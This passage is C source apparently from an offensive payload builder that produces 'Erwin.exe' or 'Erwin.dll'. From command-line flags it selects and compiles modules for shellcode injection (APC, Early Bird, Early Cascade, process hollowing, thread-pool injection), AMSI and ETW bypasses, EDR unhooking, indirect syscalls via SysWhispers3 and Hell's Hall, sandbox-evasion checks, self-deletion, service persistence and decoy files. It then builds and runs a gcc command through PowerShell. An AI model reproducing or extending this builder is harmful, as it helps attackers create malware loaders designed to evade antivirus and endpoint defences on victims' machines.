	BOOL indirectFlag_syswhispers_knowndlls = FALSE;
	BOOL indirectFlag_syswhispers_debug = FALSE;
	BOOL indirectFlag_syswhispers_hookchain = FALSE;
		//etw
	BOOL indirectFlag_syswhispers_eventwrite = FALSE;
	BOOL indirectFlag_syswhispers_TraceEvent = FALSE;
	BOOL indirectFlag_syswhispers_peventwritefull = FALSE;


	//indirect syscalls hellshall
		//exec
	BOOL indirectFlag_init = FALSE;
	BOOL indirectFlag_hellshall_apc = FALSE;
	BOOL indirectFlag_hellshall_earlybird_debug = FALSE;
	BOOL indirectFlag_hellshall_earlybird_suspended = FALSE;
	BOOL indirectFlag_hellshall_enumthreadwindows = FALSE;
	BOOL indirectFlag_hellshall_localmapping = FALSE;
	BOOL indirectFlag_hellshall_earlycascade = FALSE;
	BOOL indirectFlag_hellshall_fibers = FALSE;
	BOOL indirectFlag_hellshall_hypnosis = FALSE;
	BOOL indirectFlag_hellshall_tpalloc = FALSE;
	BOOL indirectFlag_hellshall_local_hollowing = FALSE;

		//amsi
	BOOL indirectFlag_amsi_opensession = FALSE;
	BOOL indirectFlag_amsi_scanbuffer = FALSE;
	BOOL indirectFlag_amsi_signature = FALSE;
	BOOL indirectFlag_amsi_codetrust = FALSE;
		//unhooking
	BOOL indirectFlag_unhooking_diskcreatefile = FALSE;
	BOOL indirectFlag_unhooking_knowndlls = FALSE;
	BOOL indirectFlag_unhooking_debug = FALSE;
	BOOL indirectFlag_unhooking_hookchain = FALSE;
		//etw
	BOOL indirectFlag_etw_eventwrite = FALSE;
	BOOL indirectFlag_etw_TraceEvent = FALSE;
	BOOL indirectFlag_etw_peventwritefull = FALSE;



	//misc
	BOOL miscFlag_nowindow = FALSE;
	BOOL miscFlag_printf = FALSE;
	BOOL miscFlag_dll = FALSE;
	BOOL miscFlag_service = FALSE;
	BOOL miscFlag_decoy = FALSE;
	BOOL miscFlag_inflate = FALSE;

	// Get executable path
	DWORD pathLength = GetModuleFileNameA(NULL, exePath, MAX_PATH);
	if (pathLength == 0 || pathLength >= MAX_PATH) {
		printf("Failed to get executable path.\n");
		return;
	}

	//exec

	if (strstr(extra_arg, "normal-apc") != NULL) {
		normal_apc = TRUE;
	}

	if (strstr(extra_arg, "normal-earlybird-suspended") != NULL) {
		normal_Early_Bird_Suspended = TRUE;
	}

	if (strstr(extra_arg, "normal-earlybird-debug") != NULL) {
		normal_Early_Bird_Debug = TRUE;
	}

	if (strstr(extra_arg, "normal-enumthreadwindows") != NULL) {
		normal_EnumThreadWindows = TRUE;
	}

	if (strstr(extra_arg, "normal-localmapping") != NULL) {
		normal_Local_Mapping_Inject = TRUE;
	}

	if (strstr(extra_arg, "normal-earlycascade") != NULL) {
		normal_Early_Cascade = TRUE;
	}

	if (strstr(extra_arg, "normal-fibers") != NULL) {
		normal_fibers = TRUE;
	}

	if (strstr(extra_arg, "normal-hypnosis") != NULL) {
		normal_hypnosis = TRUE;
	}

	if (strstr(extra_arg, "normal-tpalloc") != NULL) {
		normal_tpalloc = TRUE;
	}

	if (strstr(extra_arg, "normal-local-hollowing") != NULL) {
		normal_local_holllowing = TRUE;
	}

	// Check which flags are active based on the extra_arg parameter
	//amsi
	if (strstr(extra_arg, "amsi-opensession") != NULL) {
		amsiFlag_opensession = TRUE;
	}

	if (strstr(extra_arg, "amsi-scanbuffer") != NULL) {
		amsiFlag_scanbuffer = TRUE;
	}

	if (strstr(extra_arg, "amsi-signature") != NULL) {
		amsiFlag_signature = TRUE;
	}

	if (strstr(extra_arg, "amsi-codetrust") != NULL) {
		amsiFlag_codetrust = TRUE;
	}

	//unhooking
	if (strstr(extra_arg, "unhooking-createfile") != NULL) {
		unhookingFlag_diskcreatefile = TRUE;
	}

	if (strstr(extra_arg, "unhooking-knowndlls") != NULL) {
		unhookingFlag_knowndlls = TRUE;
	}

	if (strstr(extra_arg, "unhooking-debug") != NULL) {
		unhookingFlag_debug = TRUE;
	}

	if (strstr(extra_arg, "hookchain") != NULL) {
		unhookingFlag_hookchain = TRUE;
	}

	//etw
	if (strstr(extra_arg, "etw-eventwrite") != NULL) {
		etwFlag_eventwrite = TRUE;
	}

	if (strstr(extra_arg, "etw-trace-event") != NULL) {
		etwFlag_TraceEvent = TRUE;
	}

	if (strstr(extra_arg, "etw-peventwritefull") != NULL) {
		etwFlag_peventwritefull = TRUE;
	}

	//sandbox
	if (strstr(extra_arg, "api-hammering") != NULL) {
		sandboxFlag_apihammering = TRUE;
	}

	if (strstr(extra_arg, "mouse-clicks") != NULL) {
		sandboxFlag_mouseclicks = TRUE;
	}

	if (strstr(extra_arg, "resolution") != NULL) {
		sandboxFlag_resolution = TRUE;
	}

	if (strstr(extra_arg, "processes") != NULL) {
		sandboxFlag_processes = TRUE;
	}

	if (strstr(extra_arg, "hardware") != NULL) {
		sandboxFlag_hardware = TRUE;
	}

	if (strstr(extra_arg, "delay-mwfmoex") != NULL) {
		sandboxFlag_mwfmoex = TRUE;
	}

	if (strstr(extra_arg, "ntdelay") != NULL) {
		sandboxFlag_ntdelay = TRUE;
	}

	if (strstr(extra_arg, "fibonacci") != NULL) {
		sandboxFlag_fibonacci = TRUE;
	}

	//payload-control
	if (strstr(extra_arg, "check-running") != NULL) {
		payloadFlag_control = TRUE;
	}

	if (strstr(extra_arg, "self-delete") != NULL) {
		payloadFlag_selfdelete = TRUE;
	}

	//indirect syscalls syswhipers3

		//exec
	if (strstr(extra_arg, "init-syswhispers") != NULL) {
		indirectFlag_init_syswhispers = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-apc") != NULL) {
		indirectFlag_syswhispers_apc = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-earlybird-debug") != NULL) {
		indirectFlag_syswhispers_earlybird_debug = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-earlybird-suspended") != NULL) {
		indirectFlag_syswhispers_earlybird_suspended = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-enumthreadwindows") != NULL) {
		indirectFlag_syswhispers_enumthreadwindows = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-localmapping") != NULL) {
		indirectFlag_syswhispers_localmapping = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-earlycascade") != NULL) {
		indirectFlag_syswhispers_earlycascade = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-fibers") != NULL) {
		indirectFlag_syswhispers_fibers = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-hypnosis") != NULL) {
		indirectFlag_syswhispers_hypnosis = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-tpalloc") != NULL) {
		indirectFlag_syswhispers_tpalloc = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-local-hollowing") != NULL) {
		indirectFlag_syswhispers_local_hollowing = TRUE;
	}


		//amsi
	
	if (strstr(extra_arg, "syswhispers-amsi-opensession") != NULL) {
		indirectFlag_syswhispers_opensession = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-amsi-scanbuffer") != NULL) {
		indirectFlag_syswhispers_scanbuffer = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-amsi-signature") != NULL) {
		indirectFlag_syswhispers_signature = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-amsi-codetrust") != NULL) {
		indirectFlag_syswhispers_codetrust = TRUE;
	}
	
		//unhooking
	
	if (strstr(extra_arg, "syswhispers-unhooking-createfile") != NULL) {
		indirectFlag_syswhispers_diskcreatefile = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-unhooking-known-dlls") != NULL) {
		indirectFlag_syswhispers_knowndlls = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-unhooking-debug") != NULL) {
		indirectFlag_syswhispers_debug = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-unhooking-hookchain") != NULL) {
		indirectFlag_syswhispers_hookchain = TRUE;
	}

		//etw

	if (strstr(extra_arg, "syswhispers-etw-eventwrite") != NULL) {
		indirectFlag_syswhispers_eventwrite = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-etw-traceevent") != NULL) {
		indirectFlag_syswhispers_TraceEvent = TRUE;
	}

	if (strstr(extra_arg, "syswhispers-etw-peventwritefull") != NULL) {
		indirectFlag_syswhispers_peventwritefull = TRUE;
	}

	//indirect syscalls hellshall
		
		//exec
	if (strstr(extra_arg, "init-syscalls") != NULL) {
		indirectFlag_init = TRUE;
	}

	if (strstr(extra_arg, "hellshall-apc") != NULL) {
		indirectFlag_hellshall_apc = TRUE;
	}

	if (strstr(extra_arg, "hellshall-earlybird-debug") != NULL) {
		indirectFlag_hellshall_earlybird_debug = TRUE;
	}

	if (strstr(extra_arg, "hellshall-earlybird-suspended") != NULL) {
		indirectFlag_hellshall_earlybird_suspended = TRUE;
	}

	if (strstr(extra_arg, "hellshall-enumthreadwindows") != NULL) {
		indirectFlag_hellshall_enumthreadwindows = TRUE;
	}

	if (strstr(extra_arg, "hellshall-localmapping") != NULL) {
		indirectFlag_hellshall_localmapping = TRUE;
	}

	if (strstr(extra_arg, "hellshall-earlycascade") != NULL) {
		indirectFlag_hellshall_earlycascade = TRUE;
	}

	if (strstr(extra_arg, "hellshall-fibers") != NULL) {
		indirectFlag_hellshall_fibers = TRUE;
	}

	if (strstr(extra_arg, "hellshall-hypnosis") != NULL) {
		indirectFlag_hellshall_hypnosis = TRUE;
	}

	if (strstr(extra_arg, "hellshall-tpalloc") != NULL) {
		indirectFlag_hellshall_tpalloc = TRUE;
	}

	if (strstr(extra_arg, "hellshall-local-hollowing") != NULL) {
		indirectFlag_hellshall_local_hollowing = TRUE;
	}
	

		//amsi
	if (strstr(extra_arg, "hellshall-amsi-opensession") != NULL) {
		indirectFlag_amsi_opensession = TRUE;
	}

	if (strstr(extra_arg, "hellshall-amsi-scanbuf") != NULL) {
		indirectFlag_amsi_scanbuffer = TRUE;
	}

	if (strstr(extra_arg, "hellshall-amsi-signature") != NULL) {
		indirectFlag_amsi_signature = TRUE;
	}

	if (strstr(extra_arg, "hellshall-amsi-codetrust") != NULL) {
		indirectFlag_amsi_codetrust = TRUE;
	}
		//unhooking
	if (strstr(extra_arg, "hellshall-unhooking-createfile") != NULL) {
		indirectFlag_unhooking_diskcreatefile = TRUE;
	}

	if (strstr(extra_arg, "hellshall-unhooking-knowndlls") != NULL) {
		indirectFlag_unhooking_knowndlls = TRUE;
	}

	if (strstr(extra_arg, "hellshall-unhooking-debug") != NULL) {
		indirectFlag_unhooking_debug = TRUE;
	}

	if (strstr(extra_arg, "hellshall-unhooking-hookchain") != NULL) {
		indirectFlag_unhooking_hookchain = TRUE;
	}
	
		//etw

	if (strstr(extra_arg, "hellshall-etw-eventwrite") != NULL) {
		indirectFlag_etw_eventwrite = TRUE;
	}

	if (strstr(extra_arg, "hellshall-etw-traceevent") != NULL) {
		indirectFlag_etw_TraceEvent = TRUE;
	}

	if (strstr(extra_arg, "hellshall-etw-peventwritefull") != NULL) {
		indirectFlag_etw_peventwritefull = TRUE;
	}

		//sandbox

	//misc
	if (strstr(extra_arg, "no-window") != NULL) {
		miscFlag_nowindow = TRUE;
	}

	if (strstr(extra_arg, "service") != NULL) {
		miscFlag_service = TRUE;
	}

	if (strstr(extra_arg, "no-print") != NULL) {
		miscFlag_printf = TRUE;
	}

	if (strstr(extra_arg, "make-dll") != NULL) {
		miscFlag_dll = TRUE;
		strcpy(outputFile, "output\\erwin\\Erwin.dll"); 
	}

	if (strstr(extra_arg, "decoy") != NULL) {
		miscFlag_decoy = TRUE;
	}

	if (strstr(extra_arg, "inflate") != NULL) {
		miscFlag_inflate = TRUE;
	}


	// Start building the source files list with common files
	strcat(sourceFiles, "output\\code\\enc.c output\\code\\enc.h output\\code\\exec.c output\\code\\api_hashing.cpp ");
	strcat(sourceFiles, "output\\code\\api_hashing.h output\\code\\iat_camuflage.c output\\code\\iat_camuflage.h output\\code\\typedef.h output\\code\\typedef.c output\\code\\exec.h ");
	strcat(sourceFiles, "output\\code\\start.c ");

	//exec
	// 
		//APC
	if (normal_apc) {
		strcat(sourceFiles, "output\\code\\apc.c ");
		printf("[+] Including EXEC (APC) functionality in compilation...\n");
	}

		//Early Bird Suspended
	if (normal_Early_Bird_Suspended) {
		strcat(sourceFiles, "output\\code\\early_bird_suspended.c ");
		printf("[+] Including EXEC (Early Bird Suspended) functionality in compilation...\n");
	}

		//Early Bird Debug
	if (normal_Early_Bird_Debug) {
		strcat(sourceFiles, "output\\code\\early_bird_debug.c ");
		printf("[+] Including EXEC (Early Bird Debug) functionality in compilation...\n");
	}

		//EnumThreadWindows
	if (normal_EnumThreadWindows) {
		strcat(sourceFiles, "output\\code\\callback_enumthreadwindows.c ");
		printf("[+] Including EXEC (EnumThreadWindows) functionality in compilation...\n");
	}

		//Local Mapping Inject
	if (normal_Local_Mapping_Inject) {
		strcat(sourceFiles, "output\\code\\local_mapping.c ");
		printf("[+] Including EXEC (Local Mapping Inject) functionality in compilation...\n");
	}

		//Early Cascade
	if (normal_Early_Cascade) {	
		strcat(sourceFiles, "output\\code\\earlycascade.c output\\code\\stub.obj -lgcc ");
		//strcat(sourceFiles, "output\\earlycascade.c ");
		printf("[+] Including EXEC (Early Cascade) functionality in compilation...\n");
	}

		//Fibers
	if (normal_fibers) {
		strcat(sourceFiles, "output\\code\\fibers.c ");
		printf("[+] Including EXEC (Fibers) functionality in compilation...\n");
	}

		//Hypnosis
	if (normal_hypnosis) {
		strcat(sourceFiles, "output\\code\\process_hypnosis.c ");
		printf("[+] Including EXEC (Process Hypnosis) functionality in compilation...\n");
	}

		//Tpalloc
	if (normal_tpalloc) {
		strcat(sourceFiles, "output\\code\\tpallocinject.c ");
		printf("[+] Including EXEC (Tp Alloc) functionality in compilation...\n");
	}
		//Local Hollowing
	if (normal_local_holllowing) {
		strcat(sourceFiles, "output\\code\\local_hollowing.c ");
		printf("[+] Including EXEC (Local Hollowing) functionality in compilation...\n");
	}

	// Add optional files based on flags

	//amsi
	if (amsiFlag_opensession) {
		strcat(sourceFiles, "output\\code\\amsiopensession.c output\\code\\amsi_functions.h ");
		//strcat(compilerFlags, " -DAMSI_OPENSESSION");
		printf("[+] Including AMSI bypass (AmsiOpenSession) in compilation...\n");
	}

	if (amsiFlag_scanbuffer) {
		strcat(sourceFiles, "output\\code\\amsiscanbuffer.c output\\code\\amsi_functions.h ");
		//strcat(compilerFlags, " -DAMSI_SCANBUFFER");
		printf("[+] Including AMSI bypass (AmsiScanBuffer) in compilation...\n");
	}

	if (amsiFlag_signature) {
		strcat(sourceFiles, "output\\code\\amsisignature.c output\\code\\amsi_functions.h ");
		//strcat(compilerFlags, " -DAMSI_SIGNATURE");
		printf("[+] Including AMSI bypass (AmsiSignature) in compilation...\n");
	}

	if (amsiFlag_codetrust) {
		strcat(sourceFiles, "output\\code\\codetrust.c output\\code\\amsi_functions.h ");
		//strcat(compilerFlags, " -DAMSI_CODETRUST");
		printf("[+] Including AMSI bypass (CodeTrust) in compilation...\n");
	}


	//unhooking
	if (unhookingFlag_diskcreatefile) {
		strcat(sourceFiles, "output\\code\\unhooking_disk_createfile.c output\\code\\unhooking_functions.h ");
		//strcat(compilerFlags, " -DUNHOOKING_DISKCREATEFILE");
		printf("[+] Including Unhooking (CreateFile) functionality in compilation...\n");
	}

	if (unhookingFlag_knowndlls) {
		strcat(sourceFiles, "output\\code\\unhooking_known_dlls.c output\\code\\unhooking_functions.h ");
		//strcat(compilerFlags, " -DUNHOOKING_KNOWNDLLS");
		printf("[+] Including Unhooking (KnownDlls) functionality in compilation...\n");
	}

	if (unhookingFlag_debug) {
		strcat(sourceFiles, "output\\code\\unhooking_process_debug.c output\\code\\unhooking_functions.h ");
		//strcat(compilerFlags, " -DUNHOOKING_DEBUG");
		printf("[+] Including Unhooking (Debug Process) functionality in compilation...\n");
	}

	if (unhookingFlag_hookchain) {
		strcat(sourceFiles, "output\\code\\windows_common.h output\\code\\hook.h output\\code\\hook.c output\\code\\hookchain.obj output\\code\\unhooking_functions.h ");
		//strcat(compilerFlags, " -DUNHOOKING_HOOKCHAIN");
		printf("[+] Including Unhooking (Hookchain) functionality in compilation...\n");
	}

	//etw
	if (etwFlag_eventwrite) {
		strcat(sourceFiles, "output\\code\\etw.h output\\code\\etweventwrite.c ");
		//strcat(compilerFlags, " -DETW_EVENTWRITE");
		printf("[+] Including ETW (EVENTWRITE) bypass functionality in compilation...\n");
	}

	if (etwFlag_TraceEvent) {
		strcat(sourceFiles, "output\\code\\etw.h output\\code\\ntTraceEvent.c ");
		//strcat(compilerFlags, " -DETW_TRACEEVENT");
		printf("[+] Including ETW (Trace Event) bypass functionality in compilation...\n");
	}

	if (etwFlag_peventwritefull) {
		strcat(sourceFiles, "output\\code\\etw.h output\\code\\etwpeventwritefull.c ");
		//strcat(compilerFlags, " -DETW_PEVENTWIRTEFULL");
		printf("[+] Including ETW (pEventWriteFull) bypass functionality in compilation...\n");
	}

	//sandbox
	if (sandboxFlag_apihammering) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\apihammering.c ");
		//strcat(compilerFlags, " -DSANDBOX_APIHAMMERING");
		printf("[+] Including SANDBOX (API Hammering) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_mouseclicks) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\mouse_clicks.c ");
		//strcat(compilerFlags, " -DSANDBOX_MOUSECLICKS");
		printf("[+] Including SANDBOX (Mouse Clicks) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_resolution) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\monitor.c ");
		//strcat(compilerFlags, " -DSANDBOX_RESOLUTION");
		printf("[+] Including SANDBOX (Monitor Resolution) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_processes) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\processes.c -lgcc ");
		//strcat(compilerFlags, " -DSANDBOX_PROCESSES");
		printf("[+] Including SANDBOX (Number of Processes) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_hardware) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\hardware.c -ladvapi32 ");
		//strcat(compilerFlags, " -DSANDBOX_HARDWARE");
		printf("[+] Including SANDBOX (Hardware) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_mwfmoex) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\msgwaitformultipleobjectsex.c ");
		//strcat(compilerFlags, " -DSANDBOX_MWFMOEX");
		printf("[+] Including SANDBOX (Delay MsgWaitForMultipleObjectsEx) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_ntdelay) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\ntdelayexecution.c ");
		//strcat(compilerFlags, " -DSANDBOX_NTDELAY");
		printf("[+] Including SANDBOX (Delay NtDelayExecution) bypass functionality in compilation...\n");
	}

	if (sandboxFlag_fibonacci) {
		strcat(sourceFiles, "output\\code\\sandbox.h output\\code\\Fibonacci.c ");
		//strcat(compilerFlags, " -DSANDBOX_FIBONACCI");
		printf("[+] Including SANDBOX (Delay Caculating Fibonacci) bypass functionality in compilation...\n");
	}

	//payload-control
	if (payloadFlag_control) {
		strcat(sourceFiles, "output\\code\\payloadcontrol.h output\\code\\semaphore.c ");
		//strcat(compilerFlags, " -DCONTROL_RUNNING");
		printf("[+] Including PAYLOAD-CONTROL (Running executable) bypass functionality in compilation...\n");
	}

	if (payloadFlag_selfdelete) {
		strcat(sourceFiles, "output\\code\\payloadcontrol.h output\\code\\self-del.c ");
		//strcat(compilerFlags, " -DCONTROL_SELFDELETE");
		printf("[+] Including PAYLOAD-CONTROL (Self deletion) bypass functionality in compilation...\n");
	}

	//indirect syscalls syswhispers
		
		//exec
	if (indirectFlag_init_syswhispers) {
		strcat(sourceFiles, "output\\code\\syscalls.c output\\code\\syscalls.h output\\code\\syscalls.obj ");
		//strcat(compilerFlags, " -DSYSWHISPERS_INIT");
		printf("[+] Including INDIRECT SYSCALLS (Initialize Syswhispers3) functionality in compilation...\n");
	}
		
	if (indirectFlag_syswhispers_apc) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers APC) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_earlybird_debug) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Early Bird Debug) functionality in compilation...\n");
	}
	
	if (indirectFlag_syswhispers_earlybird_suspended) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Early Bird Suspended) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_enumthreadwindows) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers EnumThreadWindows) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_localmapping) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Local Mapping) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_earlycascade) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Early Cascade) functionality in compilation...\n");
	}
	
	if (indirectFlag_syswhispers_fibers) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Fibers) functionality in compilation...\n");
	}
	
	if (indirectFlag_syswhispers_hypnosis) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Process Hypnosis) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_tpalloc) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Tp Alloc) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_local_hollowing) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Local Hollowing) functionality in compilation...\n");
	}
	
		//amsi

	if (indirectFlag_syswhispers_opensession) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers AMSI OpenSession) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_scanbuffer) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers AMSI ScanBuffer) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_signature) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers AMSI Signature) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_codetrust) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers AMSI CodeTrust) functionality in compilation...\n");
	}
	
		//unhooking
	
	if (indirectFlag_syswhispers_diskcreatefile) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Unhooking DiskCreateFile) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_knowndlls) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Unhooking KnownDlls) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_debug) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Unhooking Debug Process) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_hookchain) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers Unhooking Hookchain) functionality in compilation...\n");
	}
		//etw

	if (indirectFlag_syswhispers_eventwrite) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers ETW EventWrite) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_TraceEvent) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers ETW TraceEvent) functionality in compilation...\n");
	}

	if (indirectFlag_syswhispers_peventwritefull) {
		printf("[+] Including INDIRECT SYSCALLS (SysWhispers ETW pEventWriteFull) functionality in compilation...\n");
	}

	//indirect syscalls hellshall
		//exec
	if (indirectFlag_init) {
		strcat(sourceFiles, "output\\code\\init.c output\\code\\HellsHall.h output\\code\\init.h output\\code\\HellsHall.c output\\code\\HellsHall.h output\\code\\Structs.h output\\code\\HellsAsm.obj ");
		//strcat(compilerFlags, " -DHELLSHALL_INIT");
		printf("[+] Including INDIRECT SYSCALLS (Initialize Indirect Syscalls) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_apc) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall APC) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_earlybird_debug) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Early Bird Debug) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_earlybird_suspended) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Early Bird Suspended) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_enumthreadwindows) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall EnumThreadWindows) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_localmapping) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Local Mapping) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_earlycascade) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Early Cascade) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_fibers) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Fibers) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_hypnosis) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Process Hypnosis) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_tpalloc) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Tp Alloc) functionality in compilation...\n");
	}

	if (indirectFlag_hellshall_local_hollowing) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Local Hollowing) functionality in compilation...\n");
	}

		//amsi
	if (indirectFlag_amsi_opensession) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall AMSI OpenSession) functionality in compilation...\n");
	}

	if (indirectFlag_amsi_scanbuffer) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall AMSI ScanBuffer) functionality in compilation...\n");
	}

	if (indirectFlag_amsi_signature) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall AMSI Signature) functionality in compilation...\n");
	}

	if (indirectFlag_amsi_codetrust) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall AMSI CodeTrust) functionality in compilation...\n");
	}
		//unhooking
	if (indirectFlag_unhooking_diskcreatefile) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Unhooking DiskCreateFile) functionality in compilation...\n");
	}

	if (indirectFlag_unhooking_knowndlls) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Unhooking KnownDlls) functionality in compilation...\n");
	}

	if (indirectFlag_unhooking_debug) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Unhooking Debug Process) functionality in compilation...\n");
	}

	if (indirectFlag_unhooking_hookchain) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall Hookchain) functionality in compilation...\n");
	}
		//etw

	if (indirectFlag_etw_eventwrite) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall ETW EventWrite) functionality in compilation...\n");
	}

	if (indirectFlag_etw_TraceEvent) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall ETW TraceEvent) functionality in compilation...\n");
	}

	if (indirectFlag_etw_peventwritefull) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall ETW pEventWriteFull) functionality in compilation...\n");
	}

		//sandbox


	//misc
	if (miscFlag_nowindow) {
		strcat(sourceFiles, "-mwindows -Wall ");
		//strcat(compilerFlags, " -DMISC_NOWINDOW");
		printf("[+] Including MISC (No Window) functionality in compilation...\n");
	}

	if (miscFlag_service) {
		strcat(sourceFiles, "output\\code\\service.c output\\code\\service.h -ladvapi32 ");
		//strcat(compilerFlags, " -DMISC_SERVICE");
		printf("[+] Including MISC (Run as a Service) functionality in compilation...\n");
	}


	if (miscFlag_dll) {
		strcat(sourceFiles, "output\\code\\dll.h output\\code\\dllmain.cpp -shared ");
		//strcat(compilerFlags, " -DMISC_DLL");
		printf("[+] Including MISC (DLL Output) functionality in compilation...\n");
	}

	if (miscFlag_inflate) {
		//strcat(compilerFlags, " -DMISC_INFLATE");
		printf("[+] Including MISC (Inflate) functionality in compilation...\n");
	}


	if (miscFlag_decoy) {
		strcat(sourceFiles, "output\\code\\decoy.c output\\code\\EntropyReducer.h output\\code\\EntropyReducer.c -lshell32 ");
		//strcat(compilerFlags, " -DMISC_DECOY");
		printf("[+] Including MISC (File Decoy) functionality in compilation...\n");
	}


	if (miscFlag_printf) {
		//strcat(compilerFlags, " -DMISC_NOPRINT");
		printf("[+] Including MISC (No Print) functionality in compilation...\n");
	}

	
	// Build the full compilation command
	snprintf(compileCommand, sizeof(compileCommand),
		"powershell.exe -Command \""
		"$old = $env:PATH; "
		"$env:PATH = '%s\\founding\\compile\\mingw64\\bin;' + $env:PATH; "
		"founding\\compile\\mingw64\\bin\\gcc.exe %s "
		"-L '%s\\founding\\compile\\mingw64\\lib' "
		"%s "
		"-lbcrypt -municode -w -o %s "
		"-lkernel32 -luser32 -lmsvcrt; "
		"$env:PATH = $old\"",
		exePath, compilerFlags, exePath, sourceFiles, outputFile);

	// Execute the compilation command
	STARTUPINFOA Si = { sizeof(Si) };
	PROCESS_INFORMATION Pi;


	printf("[+] Compiling with GCC...\n");

	if (!CreateProcessA(NULL, compileCommand, NULL, NULL, FALSE, 0, NULL, NULL, &Si, &Pi)) {
		printf("CreateProcess failed (%d).\n", GetLastError());
		return;
	}

	WaitForSingleObject(Pi.hProcess, INFINITE);
	
	//printf("compile command: %s\n", compileCommand);

	DWORD exitCode;
	if (GetExitCodeProcess(Pi.hProcess, &exitCode)) {
		if (exitCode == 0) {
			// Print details about what was included in the compilation
			
			
			printf("[+] Compilation successful.\n");
			if (miscFlag_dll) {
				printf("[+] Shinzo wo Sasageyo! Erwin.dll Created.\n");
				printf("[+] To test your DLL use the \\founding\\misc\\dll_test\\dlltest.exe\n");
			}
			else {
				printf("[+] Shinzo wo Sasageyo! Erwin.exe Created.\n");
			}

			
		}
		else {
			printf("[-] Compilation failed (Code: %d).\n", exitCode);
			printf("[-] Command attempted (partial): gcc.exe %s [...]\n", compilerFlags);
		}
	}

	CloseHandle(Pi.hProcess);
	CloseHandle(Pi.hThread);
}


